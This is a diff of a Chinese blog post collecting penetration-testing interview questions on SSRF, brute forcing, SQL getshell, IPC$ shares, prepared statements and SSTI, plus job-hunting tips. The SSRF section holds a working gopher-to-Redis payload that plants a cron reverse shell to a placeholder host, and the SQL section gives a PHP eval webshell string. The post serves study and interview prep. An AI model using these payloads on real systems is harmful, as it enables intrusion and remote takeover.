@@ -10,19 +10,19 @@
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="问到的面试题，记一下，欢迎大佬补充思路">
+  <meta name="description" content="问到的面试题，记一下，欢迎大佬补充和指正">
 <meta property="og:type" content="article">
 <meta property="og:title" content="面试">
 <meta property="og:url" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/index.html">
 <meta property="og:site_name" content="Sn1pEr&#39;s blog">
-<meta property="og:description" content="问到的面试题，记一下，欢迎大佬补充思路">
+<meta property="og:description" content="问到的面试题，记一下，欢迎大佬补充和指正">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210415111601.png">
 <meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210401104534.png">
 <meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210401105338.png">
 <meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210401104534.png">
 <meta property="article:published_time" content="2021-03-30T02:29:18.000Z">
-<meta property="article:modified_time" content="2021-06-07T07:01:40.648Z">
+<meta property="article:modified_time" content="2021-07-09T10:43:48.221Z">
 <meta property="article:author" content="Sn1pEr">
 <meta property="article:tag" content="面试题">
 <meta name="twitter:card" content="summary">
@@ -246,7 +246,7 @@ var _hmt = _hmt || [];
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">1.2k字</span>
+      <span class="post-count">2k字</span>
     </span>
   </span>
 
@@ -255,7 +255,7 @@ var _hmt = _hmt || [];
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">4分</span>
+      <span class="post-count">7分</span>
     </span>
   </span>
 </div>
@@ -266,14 +266,14 @@ var _hmt = _hmt || [];
   
   <div class="article-entry" itemprop="articleBody">
     
-    <p>问到的面试题，记一下，欢迎大佬补充思路</p>
+    <p>问到的面试题，记一下，欢迎大佬补充和指正</p>
 <a id="more"></a>
 
 <h3 id="什么是SSRF，怎么判断有SSRF，他有什么危害"><a href="#什么是SSRF，怎么判断有SSRF，他有什么危害" class="headerlink" title="什么是SSRF，怎么判断有SSRF，他有什么危害"></a>什么是SSRF，怎么判断有SSRF，他有什么危害</h3><p>SSRF是服务端请求伪造，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞，简单地说，就是利用一个可发起网络请求的服务当作跳板来攻击其他服务。</p>
 <p><img src="./img-20210415111601.png"></p>
 <p>一般用来读取本机文件(file协议)，端口存活（<code>?url=127.0.0.1:1</code>，爆破端口），dict协议读取端口版本信息（<code>?url=dict://127.0.0.1:22</code>），gopher通过redis反弹shell（假设网站路径为/var/www/html，且redis可未授权访问 <code>?url=gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code>）</p>
 <p>如何判断：利用dnslog生成url，然后用http协议访问即可。</p>
-<p>危害：file协议读取本地文件，探测内网IP，扫描内网端口，攻击内网或本地的应用程序</p>
+<p>危害：file协议等读取本地文件，探测内网IP，扫描内网端口，攻击内网或本地的应用程序</p>
 <h3 id="如果给定一个无验证码的网站，在提交参数未知的情况下该如何实现爆破，如何知道他爆破成功"><a href="#如果给定一个无验证码的网站，在提交参数未知的情况下该如何实现爆破，如何知道他爆破成功" class="headerlink" title="如果给定一个无验证码的网站，在提交参数未知的情况下该如何实现爆破，如何知道他爆破成功"></a>如果给定一个无验证码的网站，在提交参数未知的情况下该如何实现爆破，如何知道他爆破成功</h3><h4 id="获取参数"><a href="#获取参数" class="headerlink" title="获取参数"></a>获取参数</h4><ol>
 <li>查找form表单里面的input参数，包括hidden的（有前端）</li>
 <li>有时会有js对其进行处理，所以要找到处理的js（前端加密）</li>
@@ -315,10 +315,25 @@ var _hmt = _hmt || [];
 <li>开启general log并修改他的存储位置，然后执行<code>select &#39;&lt;?php @eval($_POST[a]);?&gt;&#39;</code>。</li>
 <li>sqlmap –os-shell，GPC为off，php主动转义的功能关闭，必须是root权限（原理和1基本相同，写一个可上传文件的php文件，然后再通过这个文件上传一个执行系统命令的文件即可达到getshell）</li>
 </ol>
+<h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h3><p>下面是他的概念</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。</span><br></pre></td></tr></table></figure>
+<p>利用条件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">开启了139、445端口</span><br><span class="line">开启了默认共享</span><br></pre></td></tr></table></figure>
+<p>作用也很简单，就是资源共享，可以获取共享的这台计算机上的目录结构、    用户列表等信息。</p>
+<p>资源共享之后，可以用at命令来启动文件，可以是exe文件，也可以写一个批处理文件进去</p>
+<p>常用命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\127.0.0.1\ipc$ <span class="string">&quot;password&quot;</span> /user:<span class="string">&quot;username&quot;</span> <span class="comment">#建立用户名、密码连接</span></span><br><span class="line">net use z: \\127.0.0.1\c$ <span class="string">&quot;密码&quot;</span> /user:<span class="string">&quot;用户名&quot;</span>  (即可将对方的c盘映射为自己的z盘，其他盘类推) <span class="comment">#映射硬盘</span></span><br><span class="line">net use z: \\127.0.0.1\c$   <span class="comment">#直接访问</span></span><br><span class="line">net use c: /del     <span class="comment">#删除映射的c盘，其他盘类推 </span></span><br><span class="line">net use * /del      <span class="comment">#删除全部,会有提示要求按y确认</span></span><br></pre></td></tr></table></figure>
+<h3 id="预编译防sql注入"><a href="#预编译防sql注入" class="headerlink" title="预编译防sql注入"></a>预编译防sql注入</h3><p>预编译之后计算机将用户输入的数据只当成数据了，而不会有当成语法进行运行的可能。（绝大部分可以直接防止注入，有时宽字节可绕）</p>
+<p>通常来说，一条SQL语句从传入到运行经历了生成语法树、执行计划优化、执行这几个阶段。在预编译过程中，数据库首先接收到带有预编译占位符?的SQL语句，解析生成语法树(Lex)，并缓存在cache中，然后接收对应的参数信息，从cache中取出语法树设置参数，然后再进行优化和执行。由于参数信息传入前语法树就已生成，执行的语法结构也就无法因参数而改变，自然也就杜绝了SQL注入的出现。</p>
+<h3 id="app渗透流程"><a href="#app渗透流程" class="headerlink" title="app渗透流程"></a>app渗透流程</h3><h3 id="SSTI防护"><a href="#SSTI防护" class="headerlink" title="SSTI防护"></a>SSTI防护</h3><p>render_template()不渲染</p>
+<p>render_template_string()渲染</p>
 <h1 id="血和泪的教训"><a href="#血和泪的教训" class="headerlink" title="血和泪的教训"></a>血和泪的教训</h1><ol>
-<li>别写太多东西，会就写，不会就别写，别整熟悉精通那一套话术</li>
+<li>别写太多东西，会就写，不会就别写，别整熟悉精通那一套话术，一般来说面试官都是看着你的简历和博客来问问题的</li>
 <li>尽量写和申请工作相关的知识，如渗透测试就多写关于渗透测试的知识和经历</li>
-<li>多面试有好处，可以把不会的记下，之后在慢慢思考，反正简历不要钱，随便投</li>
+<li>从大三下就要开始复习基础知识和自己的博客，捋一捋自己到底学了什么，最好写个思维导图之类的。（之前某公司的师傅问我我博客内容，因为时间太久了所以一句都答不上来，直接GG）</li>
+<li>早投简历，有的公司全年都在招实习，但大部分公司在暑假前一两个月招，如果5月底才投简历找实习的话，自身水平不够很容易翻车（比如我），而且早投简历可以根据面试官问你的题目难度修改你的简历，让你你更熟悉自己（我是fw），更好查缺补漏。</li>
+<li>多面试有好处，可以把不会的记下，之后再慢慢思考，反正简历不要钱，随便投。<strong>但时间紧迫的时候完全相反</strong>，要考虑慎重，充分做好准备，多写点面试题。</li>
+<li>懂得骑驴找马，就算拿了offer，对其他公司不要声张，争取多拿几份offer，只要没有入职报到，都可以跑路，这样能给自己更多选择。</li>
 </ol>
 
     
@@ -476,7 +491,7 @@ var _hmt = _hmt || [];
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSSRF%EF%BC%8C%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E6%9C%89SSRF%EF%BC%8C%E4%BB%96%E6%9C%89%E4%BB%80%E4%B9%88%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.</span> <span class="toc-text">什么是SSRF，怎么判断有SSRF，他有什么危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E7%BB%99%E5%AE%9A%E4%B8%80%E4%B8%AA%E6%97%A0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%8C%E5%9C%A8%E6%8F%90%E4%BA%A4%E5%8F%82%E6%95%B0%E6%9C%AA%E7%9F%A5%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%AF%A5%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%88%86%E7%A0%B4%EF%BC%8C%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E4%BB%96%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F"><span class="toc-number">2.</span> <span class="toc-text">如果给定一个无验证码的网站，在提交参数未知的情况下该如何实现爆破，如何知道他爆破成功</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">获取参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F"><span class="toc-number">2.2.</span> <span class="toc-text">爆破成功</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8Clinux%E4%B8%8A%E6%98%AF%E5%90%A6%E6%9C%89%E6%AF%94%E5%AE%83%E6%9B%B4%E5%BF%AB%E7%9A%84%E6%9F%A5%E6%89%BE%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">3.</span> <span class="toc-text">find的原理是什么，linux上是否有比它更快的查找命令，原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E5%AE%9A%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E5%AE%83%E5%BC%80%E5%90%AF%E4%BA%86%E5%93%AA%E4%BA%9B%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.</span> <span class="toc-text">给定一个网站，如何获取中间件信息，如何知道它开启了哪些服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.</span> <span class="toc-text">获取中间件信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.2.</span> <span class="toc-text">服务探测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3%E5%AD%98%E6%B4%BB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text">nmap探测端口存活的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-getshell%E6%96%B9%E6%B3%95"><span class="toc-number">6.</span> <span class="toc-text">sql getshell方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%80%E5%92%8C%E6%B3%AA%E7%9A%84%E6%95%99%E8%AE%AD"><span class="toc-number"></span> <span class="toc-text">血和泪的教训</span></a>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSSRF%EF%BC%8C%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E6%9C%89SSRF%EF%BC%8C%E4%BB%96%E6%9C%89%E4%BB%80%E4%B9%88%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.</span> <span class="toc-text">什么是SSRF，怎么判断有SSRF，他有什么危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E7%BB%99%E5%AE%9A%E4%B8%80%E4%B8%AA%E6%97%A0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%8C%E5%9C%A8%E6%8F%90%E4%BA%A4%E5%8F%82%E6%95%B0%E6%9C%AA%E7%9F%A5%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%AF%A5%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%88%86%E7%A0%B4%EF%BC%8C%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E4%BB%96%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F"><span class="toc-number">2.</span> <span class="toc-text">如果给定一个无验证码的网站，在提交参数未知的情况下该如何实现爆破，如何知道他爆破成功</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">获取参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F"><span class="toc-number">2.2.</span> <span class="toc-text">爆破成功</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8Clinux%E4%B8%8A%E6%98%AF%E5%90%A6%E6%9C%89%E6%AF%94%E5%AE%83%E6%9B%B4%E5%BF%AB%E7%9A%84%E6%9F%A5%E6%89%BE%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">3.</span> <span class="toc-text">find的原理是什么，linux上是否有比它更快的查找命令，原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E5%AE%9A%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E5%AE%83%E5%BC%80%E5%90%AF%E4%BA%86%E5%93%AA%E4%BA%9B%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.</span> <span class="toc-text">给定一个网站，如何获取中间件信息，如何知道它开启了哪些服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.</span> <span class="toc-text">获取中间件信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.2.</span> <span class="toc-text">服务探测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3%E5%AD%98%E6%B4%BB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text">nmap探测端口存活的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-getshell%E6%96%B9%E6%B3%95"><span class="toc-number">6.</span> <span class="toc-text">sql getshell方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC"><span class="toc-number">7.</span> <span class="toc-text">IPC$</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91%E9%98%B2sql%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">预编译防sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#app%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">9.</span> <span class="toc-text">app渗透流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E9%98%B2%E6%8A%A4"><span class="toc-number">10.</span> <span class="toc-text">SSTI防护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%80%E5%92%8C%E6%B3%AA%E7%9A%84%E6%95%99%E8%AE%AD"><span class="toc-number"></span> <span class="toc-text">血和泪的教训</span></a>
                     </div>
                 </span>
             </div>
@@ -681,6 +696,10 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">nmap</a>
               </li>
              
@@ -697,15 +716,15 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">靶机</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">内网</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
               </li>
              
               <li class="article-tag-list-item">
